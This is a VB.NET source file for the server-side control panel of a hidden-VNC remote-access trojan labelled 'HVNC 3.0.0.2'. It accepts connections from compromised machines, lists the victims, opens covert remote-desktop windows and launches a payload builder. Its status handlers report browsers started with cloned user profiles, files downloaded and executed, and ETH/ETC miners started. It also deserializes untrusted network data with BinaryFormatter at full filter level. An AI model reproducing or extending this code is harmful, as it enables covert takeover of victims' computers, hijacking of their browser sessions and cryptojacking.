Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports System.Drawing
Imports System.IO
Imports System.Linq
Imports System.Net
Imports System.Net.Sockets
Imports System.Reflection
Imports System.Runtime.CompilerServices
Imports System.Runtime.Serialization.Formatters
Imports System.Runtime.Serialization.Formatters.Binary
Imports System.Threading
Imports System.Web
Imports System.Windows.Forms

Namespace HVNC
	Partial Public Class FrmMain
		Inherits Form

		Public Shared _clientList As List(Of TcpClient)

		Public Shared _TcpListener As TcpListener

		Private VNC_Thread As Thread

		Public Shared SelectClient As Integer

		Public Shared bool_1 As Boolean

		Public Shared int_2 As Integer

		Public Sub New()
			InitializeComponent()
		End Sub


		Private Sub Listenning()
			'
			'			checked
			Try
				_clientList = New List(Of TcpClient)()
				_TcpListener = New TcpListener(IPAddress.Any, Convert.ToInt32(HVNCListenPort.Text))
				_TcpListener.Start()
				_TcpListener.BeginAcceptTcpClient(AddressOf ResultAsync, _TcpListener)
			Catch ex As Exception
				'MessageBox.Show(ex.Message);
				Try
					If Not ex.Message.Contains("aborted") Then
						Dim enumerator As IEnumerator = Nothing
						Do
							Try
								Try
									enumerator = Application.OpenForms.GetEnumerator()
									Do While enumerator.MoveNext()
										Dim form As Form = DirectCast(enumerator.Current, Form)
										If form.Name.Contains("FrmVNC") Then
											form.Dispose()
										End If

									Loop
								Finally
									If TypeOf enumerator Is IDisposable Then
										TryCast(enumerator, IDisposable).Dispose()
									End If
								End Try
							Catch ex1 As Exception
								'MessageBox.Show(ex1.Message);
								Continue Do
							End Try
							Exit Do
						Loop

						bool_1 = False
						HVNCListenBtn.Text = "Listen"
						Dim num As Integer = _clientList.Count - 1
						For i As Integer = 0 To num
							_clientList(i).Close()
						Next i
						_clientList = New List(Of TcpClient)()
						int_2 = 0
						_TcpListener.Stop()
						Me.Text = "{ HVNC 3.0.0.2 } - Connections: 0"
					End If
				Catch ex3 As Exception
					'MessageBox.Show(ex3.Message);
				End Try
			End Try

		End Sub


		Public Shared random As New Random()
		Public Shared Function RandomNumber(ByVal length As Integer) As String
			Const chars As String = "0123456789"
			Return New String(Enumerable.Repeat(chars, length).Select(Function(s) s(random.Next(s.Length))).ToArray())
		End Function

		Public Sub ResultAsync(ByVal iasyncResult_0 As IAsyncResult)

			Try
				Dim tcpClient As TcpClient = DirectCast(iasyncResult_0.AsyncState, TcpListener).EndAcceptTcpClient(iasyncResult_0)
				tcpClient.GetStream().BeginRead(New Byte(0) {}, 0, 0, AddressOf ReadResult, tcpClient)
				_TcpListener.BeginAcceptTcpClient(AddressOf ResultAsync, _TcpListener)
			Catch ex As Exception
				'MessageBox.Show(ex.Message);
			End Try
		End Sub

		Public Sub ReadResult(ByVal iasyncResult_0 As IAsyncResult)

			Dim tcpClient As TcpClient = DirectCast(iasyncResult_0.AsyncState, TcpClient)
			'
			'			checked
			Try
				Dim binaryFormatter As New BinaryFormatter()
				binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple
				binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways
				binaryFormatter.FilterLevel = TypeFilterLevel.Full

				Dim array(7) As Byte
				Dim num As Integer = 8
				Dim num2 As Integer = 0

				Do While num > 0
					Dim num3 As Integer = tcpClient.GetStream().Read(array, num2, num)
					num -= num3
					num2 += num3
				Loop

				Dim num4 As ULong = BitConverter.ToUInt64(array, 0)
				Dim num5 As Integer = 0
				Dim array2(Convert.ToInt32(Decimal.Subtract(New Decimal(num4), 1D))) As Byte

				Using memoryStream As New MemoryStream()
					Dim num6 As Integer = 0
					Dim num7 As Integer = array2.Length

					Do While num7 > 0
						num5 = tcpClient.GetStream().Read(array2, num6, num7)
						num7 -= num5
						num6 += num5
					Loop

					memoryStream.Write(array2, 0, CInt(num4))
					memoryStream.Position = 0L

					Dim objectValue As Object = RuntimeHelpers.GetObjectValue(binaryFormatter.Deserialize(memoryStream))


					If TypeOf objectValue Is String Then
						Dim array3 As String() = CType(NewLateBinding.LateGet(objectValue, Nothing, "split", New Object(0) {"|"}, Nothing, Nothing, Nothing), String())

						Try

							If Operators.CompareString(array3(0), "54321", TextCompare:=False) = 0 Then
								Dim ipp As String

								Try
									ipp = (CType(tcpClient.Client.RemoteEndPoint, IPEndPoint)).Address.ToString()
								Catch
									ipp = (CType(tcpClient.Client.RemoteEndPoint, IPEndPoint)).Address.ToString()
								End Try

								Dim lvi As ListViewItem = New ListViewItem(New String() {" " & array3(1).Replace(" ", Nothing) & RandomNumber(5), ipp, array3(2), array3(3), array3(4), array3(5), array3(6)}) With {
									.Tag = tcpClient,
									.ImageKey = (array3(3).ToString() & ".png")
								}


							ElseIf _clientList.Contains(tcpClient) Then
								GetStatus(RuntimeHelpers.GetObjectValue(objectValue), tcpClient)
							Else
								tcpClient.Close()
							End If
						Catch ex As Exception
							'MessageBox.Show(ex.Message);
						End Try
					ElseIf _clientList.Contains(tcpClient) Then
						GetStatus(RuntimeHelpers.GetObjectValue(objectValue), tcpClient)
					Else
						tcpClient.Close()
					End If
					memoryStream.Close()
					memoryStream.Dispose()
				End Using

				tcpClient.GetStream().BeginRead(New Byte(0) {}, 0, 0, AddressOf ReadResult, tcpClient)
			Catch ex As Exception
				'MessageBox.Show(ex.Message);

				If Not ex.Message.Contains("disposed") Then
					Try
						If _clientList.Contains(tcpClient) Then
							Dim NumberReceived As Integer

							'ORIGINAL LINE: int num8 = (NumberReceived = Application.OpenForms.Count - 2);
							Dim num8 As Integer = (NumberReceived = Application.OpenForms.Count - 2)
							Do While NumberReceived >= 0
								If Application.OpenForms(NumberReceived) IsNot Nothing AndAlso Application.OpenForms(NumberReceived).Tag Is tcpClient Then
									If Application.OpenForms(NumberReceived).Visible Then
										Invoke(CType(Sub()
														 If Application.OpenForms(NumberReceived).IsHandleCreated Then
															 Application.OpenForms(NumberReceived).Close()
														 End If
													 End Sub, MethodInvoker)
										   )
									ElseIf Application.OpenForms(NumberReceived).IsHandleCreated Then
										Application.OpenForms(NumberReceived).Close()
									End If
								End If
								NumberReceived += -1
							Loop
							SyncLock _clientList
								Try
									Dim index As Integer = _clientList.IndexOf(tcpClient)
									_clientList.RemoveAt(index)
									HVNCList.Items.RemoveAt(index)
									tcpClient.Close()
									int_2 -= 1
									Me.Text = "{ HVNC 3.0.0.2 } - Connections: " & Conversions.ToString(int_2)
								Catch ex1 As Exception
									'MessageBox.Show(ex1.Message);
								End Try
							End SyncLock
						End If
					Catch ex2 As Exception
						'MessageBox.Show(ex2.Message);
					End Try
				Else
					tcpClient.Close()
				End If
			End Try

		End Sub



		Public Sub GetStatus(ByVal object_2 As Object, ByVal tcpClient_0 As TcpClient)

			Dim hashCode As Integer = tcpClient_0.GetHashCode()
			Dim vNCForm As FrmVNC = DirectCast(Application.OpenForms("VNCForm:" & Conversions.ToString(hashCode)), FrmVNC)
			If TypeOf object_2 Is Bitmap Then
				vNCForm.VNCBoxe.Image = DirectCast(object_2, Image)
			Else
				If Not (TypeOf object_2 Is String) Then
					Return
				End If
				Dim dataReceive() As String = Conversions.ToString(object_2).Split("|"c)

				Dim left_Renamed As String = dataReceive(0)


				If Operators.CompareString(left_Renamed, "0", TextCompare:=False) = 0 Then
					vNCForm.VNCBoxe.Tag = New Size(Conversions.ToInteger(dataReceive(1)), Conversions.ToInteger(dataReceive(2)))
				End If


				If Operators.CompareString(left_Renamed, "9", TextCompare:=False) <> 0 Then
					Invoke(CType(Sub()
									 'MessageBox.Show(ex.Message);
									 Try
										 Clipboard.SetText(dataReceive(1))
									 Catch ex As Exception
									 End Try
								 End Sub, MethodInvoker)
					   )
				End If


				If Operators.CompareString(left_Renamed, "200", TextCompare:=False) = 0 Then
					vNCForm.FrmTransfer0.FileTransferLabele.Text = "Chrome successfully started with clone profile !"
				End If

				If Operators.CompareString(left_Renamed, "201", TextCompare:=False) = 0 Then
					vNCForm.FrmTransfer0.FileTransferLabele.Text = "Chrome successfully started !"
				End If

				If Operators.CompareString(left_Renamed, "202", TextCompare:=False) = 0 Then
					vNCForm.FrmTransfer0.FileTransferLabele.Text = "Firefox successfully started with clone profile !"
				End If

				If Operators.CompareString(left_Renamed, "203", TextCompare:=False) = 0 Then
					vNCForm.FrmTransfer0.FileTransferLabele.Text = "Firefox successfully started !"
				End If

				If Operators.CompareString(left_Renamed, "204", TextCompare:=False) = 0 Then
					vNCForm.FrmTransfer0.FileTransferLabele.Text = "Edge successfully started with clone profile !"
				End If

				If Operators.CompareString(left_Renamed, "205", TextCompare:=False) = 0 Then
					vNCForm.FrmTransfer0.FileTransferLabele.Text = "Edge successfully started !"
				End If

				If Operators.CompareString(left_Renamed, "206", TextCompare:=False) = 0 Then
					vNCForm.FrmTransfer0.FileTransferLabele.Text = "Brave successfully started with clone profile !"
				End If

				If Operators.CompareString(left_Renamed, "207", TextCompare:=False) = 0 Then
					vNCForm.FrmTransfer0.FileTransferLabele.Text = "Brave successfully started !"
				End If

				If Operators.CompareString(left_Renamed, "256", TextCompare:=False) = 0 Then
					vNCForm.FrmTransfer0.FileTransferLabele.Text = "Downloaded successfully ! | Executed..."
				End If

				If Operators.CompareString(left_Renamed, "222", TextCompare:=False) = 0 Then
					vNCForm.FrmTransfer0.FileTransferLabele.Text = "ETH miner successfully started !"
				End If

				If Operators.CompareString(left_Renamed, "223", TextCompare:=False) = 0 Then
					vNCForm.FrmTransfer0.FileTransferLabele.Text = "ETC miner successfully started !"
				End If

				If Operators.CompareString(left_Renamed, "22", TextCompare:=False) = 0 Then
					vNCForm.FrmTransfer0.int_0 = Conversions.ToInteger(dataReceive(1))
					vNCForm.FrmTransfer0.DuplicateProgesse.Value = Conversions.ToInteger(dataReceive(1))
				End If


				If Operators.CompareString(left_Renamed, "23", TextCompare:=False) = 0 Then
					vNCForm.FrmTransfer0.DuplicateProfile(Conversions.ToInteger(dataReceive(1)))
				End If


				If Operators.CompareString(left_Renamed, "24", TextCompare:=False) = 0 Then
					vNCForm.FrmTransfer0.FileTransferLabele.Text = "Clone successfully !"
				End If


				If Operators.CompareString(left_Renamed, "25", TextCompare:=False) = 0 Then
					vNCForm.FrmTransfer0.FileTransferLabele.Text = dataReceive(1)
				End If

				If Operators.CompareString(left_Renamed, "26", TextCompare:=False) = 0 Then
					vNCForm.FrmTransfer0.FileTransferLabele.Text = dataReceive(1)
				End If
			End If
		End Sub

		Private Sub HVNCList_DoubleClick(ByVal sender As Object, ByVal e As EventArgs) Handles HVNCList.DoubleClick
			If HVNCList.FocusedItem.Index = -1 Then
				Return
			End If
			'
			'			checked
			Dim num As Integer = Application.OpenForms.Count - 1
			Do
				If num >= 0 Then
					If Application.OpenForms(num).Tag Is _clientList(HVNCList.FocusedItem.Index) Then
						Exit Do
					End If
					num += -1
					Continue Do
				End If

				Dim vNCForm As New FrmVNC()
				vNCForm.Name = "VNCForm:" & Conversions.ToString(_clientList(HVNCList.FocusedItem.Index).GetHashCode())
				vNCForm.Tag = _clientList(HVNCList.FocusedItem.Index)

				Dim name_Renamed As String = HVNCList.FocusedItem.SubItems(2).ToString()
				name_Renamed = name_Renamed.Replace("ListViewSubItem", "{ HVNC 3.0.0.2 } - Connected to:")
				vNCForm.Text = name_Renamed
				vNCForm.Show()
				Return
			Loop
			Application.OpenForms(num).Show()

		End Sub

		Private Sub HVNCList_DrawColumnHeader(ByVal sender As Object, ByVal e As DrawListViewColumnHeaderEventArgs) Handles HVNCList.DrawColumnHeader
			e.DrawDefault = True
		End Sub

		Private Sub HVNCList_DrawItem(ByVal sender As Object, ByVal e As DrawListViewItemEventArgs) Handles HVNCList.DrawItem
			If Not e.Item.Selected Then
				e.DrawDefault = True
			End If
		End Sub

		Private Sub HVNCList_DrawSubItem(ByVal sender As Object, ByVal e As DrawListViewSubItemEventArgs) Handles HVNCList.DrawSubItem
			If e.Item.Selected Then
				e.Graphics.FillRectangle(New SolidBrush(Color.FromArgb(50, 50, 50)), e.Bounds)

				'ORIGINAL LINE: TextRenderer.DrawText(e.Graphics, e.SubItem.Text, new Font("Segoe UI", 9f, FontStyle.Regular, GraphicsUnit.Point), checked(new Point(e.Bounds.Left + 3, e.Bounds.Top + 2)), Color.White);
				TextRenderer.DrawText(e.Graphics, e.SubItem.Text, New Font("Segoe UI", 9.0F, FontStyle.Regular, GraphicsUnit.Point), New Point(e.Bounds.Left + 3, e.Bounds.Top + 2), Color.White)
			Else
				e.DrawDefault = True
			End If
		End Sub


		Private Sub HVNCListenBtn_Click_1(ByVal sender As Object, ByVal e As EventArgs) Handles HVNCListenBtn.Click
			If Operators.CompareString(HVNCListenBtn.Text, "Listen", TextCompare:=False) = 0 Then ' Check if listen or not
				HVNCListenBtn.Text = "Stop"

				buildHVNCToolStripMenuItem.Enabled = True

				HVNCListenBtn.Image = imageList2.Images(0)

				HVNCListenPort.Enabled = False

				VNC_Thread = New Thread(AddressOf Listenning) With {.IsBackground = True} ' Listenning

				bool_1 = True

				VNC_Thread.Start()

				Return
			End If
			Dim enumerator As IEnumerator = Nothing
			Do
				Try
					Try
						enumerator = Application.OpenForms.GetEnumerator()
						Do While enumerator.MoveNext()
							Dim form As Form = DirectCast(enumerator.Current, Form)
							If form.Name.Contains("FrmVNC") Then
								form.Dispose()
							End If

						Loop
					Finally
						If TypeOf enumerator Is IDisposable Then
							TryCast(enumerator, IDisposable).Dispose()
						End If
					End Try
				Catch ex As Exception
					'MessageBox.Show(ex.Message);
					Continue Do
				End Try
				Exit Do
			Loop

			HVNCListenPort.Enabled = True
			VNC_Thread.Abort()
			bool_1 = False
			HVNCListenBtn.Text = "Listen"
			HVNCListenBtn.Image = imageList2.Images(1)
			buildHVNCToolStripMenuItem.Enabled = False
			HVNCList.Items.Clear()
			_TcpListener.Stop()
			'
			'			checked
			Dim num As Integer = _clientList.Count - 1
			For i As Integer = 0 To num
				_clientList(i).Close()
			Next i
			_clientList = New List(Of TcpClient)()
			int_2 = 0
			Me.Text = "{ HVNC 3.0.0.2 } - Connections: 0"

		End Sub

		Private Sub buildHVNCToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles buildHVNCToolStripMenuItem.Click
			Dim frm2 As New FrmBuilder(HVNCListenPort.Text)
			frm2.ShowDialog()
		End Sub

		Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As FormClosingEventArgs) Handles MyBase.FormClosing
			SaveSettings()
			Environment.Exit(0)
		End Sub


		Private Sub FrmMain_Load(ByVal sender As Object, ByVal e As EventArgs) Handles MyBase.Load
			Me.Text = "{ HVNC 3.0.0.2 } - Connections: 0"

			ReadSettings()
		End Sub

		Public Function SaveSettings() As Boolean
			Try
				Dim filePath As String = (Path.GetDirectoryName(Application.ExecutablePath) & "\HVNC 3.0.0.2.conf")
				Dim lines As List(Of String) = File.ReadLines(filePath).ToList()
				lines(3) = "[listenning=" & listenning1.Text.ToLower() & "]"
				lines(4) = ("port=" & HVNCListenPort.Text)
				File.WriteAllLines(filePath, lines)

				Return True
			Catch
				Return False
			End Try

		End Function


		Public Function ReadSettings() As Boolean
			Try
				Dim filePath As String = (Path.GetDirectoryName(Application.ExecutablePath) & "\HVNC 3.0.0.2.conf")
				Dim lines As List(Of String) = File.ReadLines(filePath).ToList()

				Dim p As String = lines(4).Replace("port=", Nothing)
				HVNCListenPort.Text = p

				If lines(3).ToString().Contains("enabled") Then
					listenning1.SelectedIndex = 1
					listenning1.Text = "Enabled"
					HVNCListenBtn.PerformClick()
				Else
					listenning1.Text = "Disabled"
				End If


				Return True
			Catch
				Return False
			End Try
		End Function

		Private Sub listenning1_TextChanged(ByVal sender As Object, ByVal e As EventArgs) Handles listenning1.TextChanged
			SaveSettings()

		End Sub

		Private Sub HVNCListenPort_TextChanged(ByVal sender As Object, ByVal e As EventArgs) Handles HVNCListenPort.TextChanged
			SaveSettings()

		End Sub

		Private Sub contextMenuStrip1_Opening(ByVal sender As Object, ByVal e As System.ComponentModel.CancelEventArgs) Handles contextMenuStrip1.Opening

		End Sub

		Private Sub startHVNCToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles startHVNCToolStripMenuItem.Click
			If HVNCList.FocusedItem.Index = -1 Then
				Return
			End If
			'
			'			checked
			Dim num As Integer = Application.OpenForms.Count - 1
			Do
				If num >= 0 Then
					If Application.OpenForms(num).Tag Is _clientList(HVNCList.FocusedItem.Index) Then
						Exit Do
					End If
					num += -1
					Continue Do
				End If

				Dim vNCForm As New FrmVNC()
				vNCForm.Name = "VNCForm:" & Conversions.ToString(_clientList(HVNCList.FocusedItem.Index).GetHashCode())
				vNCForm.Tag = _clientList(HVNCList.FocusedItem.Index)

				Dim name_Renamed As String = HVNCList.FocusedItem.SubItems(2).ToString()
				name_Renamed = name_Renamed.Replace("ListViewSubItem", "{ HVNC 3.0.0.2 } - Connected to:")
				vNCForm.Text = name_Renamed
				vNCForm.Show()
				Return
			Loop
			Application.OpenForms(num).Show()

		End Sub

	End Class


End Namespace
